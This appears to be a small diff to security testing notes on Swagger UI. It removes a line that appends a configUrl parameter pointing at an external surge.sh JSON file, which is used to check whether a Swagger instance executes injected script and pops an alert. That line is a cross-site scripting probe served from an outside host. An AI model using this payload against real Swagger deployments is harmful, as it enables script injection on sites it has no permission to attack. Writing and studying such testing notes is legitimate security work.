@@ -16,4 +16,4 @@ paths:
 If you are lazy
 You can use just add this parameter to the URL of Swagger and see if it pops an alert:
 
-?configUrl=https://jumpy-floor.surge.sh/test.json
+
